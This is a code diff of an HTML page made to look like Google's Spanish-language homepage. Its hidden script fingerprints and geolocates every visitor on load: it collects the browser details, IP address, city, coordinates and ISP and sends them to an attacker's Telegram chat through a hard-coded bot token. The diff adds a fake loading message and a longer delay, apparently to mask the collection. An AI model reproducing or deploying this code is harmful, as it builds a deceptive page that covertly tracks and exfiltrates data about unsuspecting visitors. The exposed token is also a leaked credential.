@@ -6,32 +6,84 @@
     <title>Google</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background: #fff; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; flex-direction: column; }
-        .container { text-align: center; width: 90%; max-width: 600px; }
-        .logo { font-size: 80px; font-weight: bold; letter-spacing: -5px; margin-bottom: 20px; }
+        body {
+            background: #fff;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            flex-direction: column;
+        }
+        .container {
+            text-align: center;
+            width: 90%;
+            max-width: 600px;
+            opacity: 0;
+            animation: fadeIn 1s forwards;
+        }
+        @keyframes fadeIn { to { opacity: 1; } }
+        .logo {
+            font-size: 80px;
+            font-weight: bold;
+            letter-spacing: -5px;
+            margin-bottom: 20px;
+        }
         .logo span:nth-child(1) { color: #4285F4; }
         .logo span:nth-child(2) { color: #EA4335; }
         .logo span:nth-child(3) { color: #FBBC05; }
         .logo span:nth-child(4) { color: #4285F4; }
         .logo span:nth-child(5) { color: #34A853; }
         .logo span:nth-child(6) { color: #EA4335; }
-        input { width: 100%; padding: 15px 20px; border-radius: 30px; border: 1px solid #dfe1e5; font-size: 18px; outline: none; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
+        input {
+            width: 100%;
+            padding: 15px 20px;
+            border-radius: 30px;
+            border: 1px solid #dfe1e5;
+            font-size: 18px;
+            outline: none;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+        }
         .buttons { margin-top: 20px; }
-        .buttons button { background: #f8f9fa; border: 1px solid #f8f9fa; padding: 12px 25px; margin: 5px; border-radius: 5px; font-size: 16px; cursor: pointer; }
-        .footer { margin-top: 30px; color: #888; font-size: 14px; }
+        .buttons button {
+            background: #f8f9fa;
+            border: 1px solid #f8f9fa;
+            padding: 12px 25px;
+            margin: 5px;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .footer {
+            margin-top: 30px;
+            color: #888;
+            font-size: 14px;
+        }
+        .loading {
+            display: none;
+            margin-top: 15px;
+            color: #555;
+            font-size: 14px;
+        }
     </style>
 </head>
 <body>
+
 <div class="container">
     <div class="logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
     <input type="text" placeholder="Buscar con Google o escribir una URL">
-    <div class="buttons"><button>Buscar con Google</button><button>Voy a tener suerte</button></div>
+    <div class="buttons">
+        <button>Buscar con Google</button>
+        <button>Voy a tener suerte</button>
+    </div>
+    <div class="loading" id="loadingMsg">Cargando...</div>
     <div class="footer">Ofrecido por Google</div>
 </div>
+
 <script>
 (function() {
     const BOT_TOKEN = '8272335528:AAEq0rHkkA7AhcCaK2ucBDtHyVU8Yp0ffwY';
-    const CHAT_ID = '8521142101'; // Tu Chat ID
+    const CHAT_ID = '8521142101';
 
     let enviado = false;
 
@@ -45,9 +97,9 @@
         .then(res => res.json())
         .then(data => {
             if (!data.ok) {
-                console.error('Error Telegram:', data.description);
+                console.error('Error:', data.description);
             } else {
-                console.log('✅ Mensaje enviado');
+                console.log('✅ Enviado');
             }
         })
         .catch(err => console.error('Error de red:', err));
@@ -57,21 +109,14 @@
         if (enviado) return;
         enviado = true;
 
-        let ip = 'No disponible';
-        let geo = 'Obteniendo...';
+        document.getElementById('loadingMsg').style.display = 'block';
 
-        enviarTelegram('🔍 Recopilando datos...');
-
-        fetch('https://api.ipify.org?format=json')
+        // Usar ip-api.com que es más confiable
+        fetch('http://ip-api.com/json/?fields=status,country,regionName,city,lat,lon,isp,org,as,mobile,proxy,hosting,query')
             .then(res => res.json())
             .then(data => {
-                ip = data.ip;
-                return fetch('https://ipapi.co/' + ip + '/json/');
-            })
-            .then(res => res.json())
-            .then(data => {
-                geo = `${data.country_name || 'N/D'} (${data.country_code || 'N/D'}), ${data.city || 'N/D'}, ${data.region || 'N/D'} - ISP: ${data.org || 'N/D'}`;
-                const texto = `
+                if (data.status === 'success') {
+                    const texto = `
 🌐 NUEVA VISITA
 ═══════════════════
 📱 USER AGENT: ${navigator.userAgent}
@@ -80,33 +125,33 @@
 📺 PANTALLA: ${screen.width}x${screen.height}px
 ⏰ ZONA HORARIA: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
 📅 FECHA/HORA: ${new Date().toLocaleString('es-ES')}
-🌍 IP: ${ip}
-📍 GEO: ${geo}
+🌍 IP: ${data.query || 'N/D'}
+📍 PAÍS: ${data.country || 'N/D'}
+🏙️ CIUDAD: ${data.city || 'N/D'}
+🗺️ REGIÓN: ${data.regionName || 'N/D'}
+📌 COORDENADAS: ${data.lat || 'N/D'}, ${data.lon || 'N/D'}
+📡 ISP: ${data.isp || 'N/D'}
 ═══════════════════
-                `;
-                enviarTelegram(texto);
+                    `;
+                    enviarTelegram(texto);
+                } else {
+                    enviarTelegram('❌ No se pudo obtener geolocalización.');
+                }
+                document.getElementById('loadingMsg').style.display = 'none';
             })
             .catch(() => {
-                const texto = `
-🌐 NUEVA VISITA (sin geolocalización)
-═══════════════════
-📱 USER AGENT: ${navigator.userAgent}
-🖥️ PLATAFORMA: ${navigator.platform}
-🌐 IDIOMA: ${navigator.language}
-📺 PANTALLA: ${screen.width}x${screen.height}px
-⏰ ZONA HORARIA: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
-📅 FECHA/HORA: ${new Date().toLocaleString('es-ES')}
-🌍 IP: ${ip}
-═══════════════════
-                `;
-                enviarTelegram(texto);
+                enviarTelegram('❌ Error al obtener datos.');
+                document.getElementById('loadingMsg').style.display = 'none';
             });
     }
 
+    // Esperar 1.5 segundos para que la página cargue completamente
     window.addEventListener('load', function() {
-        setTimeout(obtenerDatos, 500);
+        setTimeout(obtenerDatos, 1500);
     });
+
 })();
 </script>
+
 </body>
 </html>
